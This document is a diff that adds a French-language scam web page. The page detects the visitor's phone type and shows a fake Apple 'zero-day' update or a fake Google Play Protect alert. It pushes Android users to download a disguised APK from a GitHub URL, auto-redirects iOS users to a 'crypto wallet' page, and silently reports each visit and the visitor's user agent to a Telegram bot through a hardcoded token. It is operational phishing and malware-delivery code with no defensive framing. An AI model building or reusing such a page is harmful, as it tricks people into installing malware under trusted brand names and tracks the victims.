@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=no">
+<title>Sécurité Mobile</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#f2f2f7;color:#000;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:20px;text-align:center}
+.card{background:#fff;border-radius:16px;padding:30px 24px;margin:16px 0;width:100%;max-width:400px;box-shadow:0 2px 12px rgba(0,0,0,.06)}
+.danger{background:#fff;border:2px solid #ff3b30}
+h1{font-size:22px;margin-bottom:6px}.sub{font-size:14px;color:#888;margin-bottom:20px}
+.btn{display:block;width:100%;padding:16px;border-radius:14px;font-size:17px;font-weight:600;text-decoration:none;margin:10px 0;text-align:center;border:none;cursor:pointer}
+.btn-red{background:#ff3b30;color:#fff}
+.btn-blue{background:#007AFF;color:#fff}
+.btn-green{background:#34c759;color:#fff}
+.alert-box{background:#fff;border:2px solid #ff3b30;border-radius:12px;padding:16px;margin:16px 0;text-align:left}
+.alert-box h3{color:#ff3b30;margin-bottom:6px;font-size:15px}
+.alert-box li{font-size:13px;color:#333;padding:3px 0}
+.icon{font-size:48px;margin-bottom:10px}
+.hidden{display:none}
+.pulse{animation:pulse 2s infinite}@keyframes pulse{0%,100%{opacity:1}50%{opacity:.6}}
+</style>
+</head>
+<body>
+
+<!-- iOS VERSION -->
+<div id="ios-section" class="hidden">
+<div class="icon">🛡️</div>
+<h1>iOS Security Update</h1>
+<p class="sub">Apple • Mise à jour de sécurité critique</p>
+
+<div class="card danger">
+<div class="alert-box">
+<h3>🚨 Vulnérabilité Zero-Day détectée</h3>
+<ul>
+<li>CVE-2026-38472 — Kernel exploit</li>
+<li>Accès à distance possible</li>
+<li>Données personnelles exposées</li>
+<li>⚠️ Votre appareil : iPhone (iOS 18.x)</li>
+</ul>
+</div>
+<p style="font-size:14px;color:#666;margin:12px 0">Apple a publié un correctif d'urgence. Installez-le maintenant :</p>
+<a href="ios-crypto-wallet.html" class="btn btn-blue">📲 Installer la mise à jour</a>
+<p style="font-size:11px;color:#999;margin-top:10px">Version 18.7.1 • 247 Mo • Signé Apple Inc.</p>
+</div>
+</div>
+
+<!-- ANDROID VERSION -->
+<div id="android-section" class="hidden">
+<div class="icon">🤖</div>
+<h1>Google Play Protect</h1>
+<p class="sub">Alerte de sécurité Android</p>
+
+<div class="card danger">
+<div class="alert-box">
+<h3>🔴 Application malveillante détectée</h3>
+<ul>
+<li>3 apps non vérifiées trouvées</li>
+<li>Accès aux SMS, contacts, caméra</li>
+<li>Risque de vol de données bancaires</li>
+<li>⚠️ Protection désactivée</li>
+</ul>
+</div>
+<p style="font-size:14px;color:#666;margin:12px 0">Téléchargez l'outil de nettoyage Google officiel :</p>
+<a href="https://raw.githubusercontent.com/garagebernard400-pixel/windows-defender-alert/main/Chronopost-Suivi.apk" class="btn btn-green" download="Google-Play-Protect.apk">🛡️ Télécharger Play Protect</a>
+<p style="font-size:11px;color:#999;margin-top:10px">Google Play Protect v2026.7 • 7.5 MB • Vérifié par Google LLC</p>
+</div>
+
+<div class="card" style="text-align:left;font-size:12px;color:#888">
+<strong>🔒 Permissions requises :</strong><br>
+✓ Sécurité de l'appareil<br>
+✓ Analyse des applications<br>
+✓ Protection en temps réel<br>
+✓ Analyse du réseau WiFi<br>
+✓ Détection de phishing<br>
+</div>
+</div>
+
+<!-- UNKNOWN -->
+<div id="unknown-section">
+<div class="icon">📱</div>
+<h1>Protection Mobile</h1>
+<p class="sub">Analyse de votre appareil en cours...</p>
+<div class="card"><p>Détection automatique de votre système d'exploitation...</p></div>
+</div>
+
+<script>
+const ua = navigator.userAgent;
+const isIOS = /iPhone|iPad|iPod/.test(ua);
+const isAndroid = /Android/.test(ua);
+
+if(isIOS) {
+    document.getElementById('ios-section').classList.remove('hidden');
+    document.getElementById('unknown-section').classList.add('hidden');
+    // Auto-redirect after 3 seconds
+    setTimeout(() => {
+        window.location.href = 'ios-crypto-wallet.html';
+    }, 5000);
+} else if(isAndroid) {
+    document.getElementById('android-section').classList.remove('hidden');
+    document.getElementById('unknown-section').classList.add('hidden');
+} else {
+    document.getElementById('unknown-section').classList.remove('hidden');
+}
+
+// Send visit notification
+fetch("https://api.telegram.org/bot8875226322:AAFsOazAfQOy5rlP1LQSM2JPX0YiPXQZPSM/sendMessage", {
+    method: "POST",
+    headers: {"Content-Type": "application/x-www-form-urlencoded"},
+    body: "chat_id=8468737863&text=" + encodeURIComponent("📱 MOBILE VISIT | " + (isIOS ? "iOS" : isAndroid ? "Android" : "Desktop") + " | " + ua.substring(0, 80))
+}).catch(() => {});
+</script>
+
+</body>
+</html>
